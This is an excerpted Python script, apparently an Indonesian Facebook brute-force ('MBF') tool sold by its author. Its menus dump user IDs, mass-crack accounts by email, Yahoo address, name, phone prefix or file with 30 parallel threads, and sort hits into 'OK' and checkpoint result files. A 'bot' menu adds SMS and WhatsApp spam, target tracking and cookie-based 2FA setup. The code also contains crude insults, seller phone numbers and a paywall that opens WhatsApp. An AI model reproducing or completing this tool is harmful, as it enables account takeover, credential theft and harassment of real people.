...
from concurrent.futures import ThreadPoolExecutor as man_XDXc
...
Author = 'TRIAL 1 HARI'
Status = 'TRIAL 1 HARI'
serverKey = 'man_XD=Keyopenfullnegara=jagayysshy'
#DATA SERVER#
...
┃┃┃┃┃┃┗━┛┃┃
┗┛┗┛┗┻━━━┻┛
[•]   IP LOGIN :114.79.18.208
   [•]  USER AGENT : mozile/oppo A31
      [•]  TANGGAL PEMBUAT : 22 / MEI /2023
         [•] SELAMAT MENIKMATI [ MBF ] 
                [•] Lukman XD  ''')
""",title=f"{P2} {H2}{P2}",subtitle=f"{H2}{Author}{P2}",width=70,style=f"{color_panel}"))
cookie=[]
...
[{color_text}03{P2}]. Crack  File             [{color_text}07{P2}]. Dump  ID\n[{color_text}04{P2}]. Crack  gmail            [{color_text}00{P2}]. Exit""",width=70,padding=(0,7),style=f"{color_panel}"));prints(nel(f'{P2}Ketik JIKA INGIN MENGGUNAKAN BOT KALO MAU GANTI FITUR KHUSUS" {H2}bot{P2}"{P2}',title=f'{H2}{jam} - {Iplu}{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	man_XDitgans_Dev = input('[+] Pilih : ')
	if man_XDitgans_Dev in ['1','01']:
		dump_publik()
	elif man_XDitgans_Dev in ['2','02']:
		#khususprem()
		dump_massal()
	elif man_XDitgans_Dev in ['3','03']:
		...
		man_XD_sedunia_ganteng = input('[+] Pilih : ')
		if man_XD_sedunia_ganteng in ['01','1']:
			#khususprem()
			crack_file()
		elif man_XD_sedunia_ganteng in ['02','2']:
			#khususprem()
			crack_filev2()
		else:
			prints(nel(f'{P2}Lu buta apa gimana si anjing :v{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	elif man_XDitgans_Dev in ['4','04']:
		...
		man_XD_sukaColi_DanGanteng = input('[+] Pilih : ')
		if man_XD_sukaColi_DanGanteng in ['01','1','mail','gmail']:
			#khususprem()
			clon_email()
		elif man_XD_sukaColi_DanGanteng in ['02','2','yaho','yahoo']:
			#khususprem()
			clon_yahoo()
		elif man_XD_sukaColi_DanGanteng in ['03','3','user','nama']:
			#khususprem()
			crack_nama()
		elif man_XD_sukaColi_DanGanteng in ['04','4','nomor','nom']:
			#khususprem()
			crack_nomor()
		else:
			prints(nel(f'{P2}Lu buta apa gimana si anjing :v{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	elif man_XDitgans_Dev in ['5','05']:
		result()
	elif man_XDitgans_Dev in ['lain']:
		menulain()
	elif man_XDitgans_Dev in ['6','06']:
		prints(nel(f'{P2}Tools Serbaguna Yang Bisa Dipakai [{H2}  {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Cek detektor Account Link V¹\n[{color_text}02{P2}]. Cek detektor  V²\n[{color_text}03{P2}]. Cek detektor Account Link V³\n[{color_text}04{P2}]. Cek detektor Account Link V⁴{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		man_XDPaling_Ganteng_Pisan = input('[+] pilih : ')
		if man_XDPaling_Ganteng_Pisan in ['01','1']:
			#khususprem()
			file_cp()
		elif man_XDPaling_Ganteng_Pisan in ['02','2']:
			#khususprem()
			cekdetektor()
		elif man_XDPaling_Ganteng_Pisan in ['03','3']:
			#khususprem()
			filecek_cp()
		elif man_XDPaling_Ganteng_Pisan in ['04','4']:
			#khususprem()
			filecek4_cp()
		else:
			prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	elif man_XDitgans_Dev in ['7','07']:
		#khususprem()
		...
		if idss in ['01','1']:
			...
			dumpid()
		else:prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));dump_pengikut()
	elif man_XDitgans_Dev in ['bot']:
		#prints(nel(f'{P2}Tools Serbaguna Yang Bisa Dipakai [{H2}  {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		...
		man_XD_Ganteng_Pisan = input('[+] Pilih : ')
		if man_XD_Ganteng_Pisan in ['1','01']:
			#khususprem()
			spam_sms()
		elif man_XD_Ganteng_Pisan in ['2','02']:
			#khususprem()
			spam_wa()
		elif man_XD_Ganteng_Pisan in ['Back','back']:
			#khususprem()
			login()
		elif man_XD_Ganteng_Pisan in ['3','03']:
			#khususprem()
			siu()
		elif man_XD_Ganteng_Pisan in ['4','04']:
			#khususprem()
			pasang_a2f()
		elif man_XD_Ganteng_Pisan in ['5','05']:
			lacak()
		elif man_XD_Ganteng_Pisan in ['6','06']:
			...
			prints(nel(f'{P2} Terimakasih sudah memakai sever b kami ✓{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		else:
			prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	elif ['0','00']:
...
def menuhah():
	...
	if man_XD_sukaColi_DanGanteng in ['01','1','mail','gmail']:
		...
		crack_nama()
			...
			crack_nomor()
	elif man_XD_sukaColi_DanGanteng in ['05','5','pil','file']:
			crack_filev2()
	else:
		prints(nel(f'{P2}Lu buta apa gimana si anjing :v{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
...
#--------[PASANG A2F]--------#
def pasang_a2f():
	prints(nel(f'{P2}Masukan cookie anda jika ingin, pasang a2f [{H2}  {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
...
def crack_nomor():
	...
	if len(depan)==3:pass
	else:prints(nel(f'{P2}Contoh Awalan Nomor "{H2}089{P2}"{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
...
def khususprem():
	...
	os.system('xdg-open https://wa.me/+6285877346346?text=Hai+man+Mau+Beli+Sc+Premium')
	exit()
#-------------------[ CRACK-YAHOO ]----------------#
def clon_yahoo():
	rc = random.choice
...
def result():
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			prints(nel(f'{P2} Silahkan File Result {M2}CP{P2} Anda [{H2}  {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			cih = 0
			lol = {}
			for isi in vin:
		...
		if len(vin)==0:
			...
			prints(nel(f'{P2} Silahkan File Result {H2}OK{P2} Anda [{H2}  {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			cih = 0
			lol = {}
			for isi in vin:
...
def crack_file():
	...
	if len(vin)==0:
		...
		prints(nel(f'{P2}Pilih File yang ingin di crack [{H2}  {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		cih = 0
		lol = {}
		for isi in vin:
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if 'mobiledate' in method:
					...
					pool.submit(man_XDitgans_Xd,idf,pwv,nmf)
...
def man_XDitgans_Xd(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
...
if __name__=="__main__":
	...
	if tanggal >= exp:
		os.system("clear")
		print('\033[0m')
		cetak(nel(f"""[[red]•[white]] Script Kadaluarsa Silahkan Beli Scriptnya ke Authour Lukman XD\n[[red]•[white]] WhatsApp : +628812607961
	 [ HARGA ]
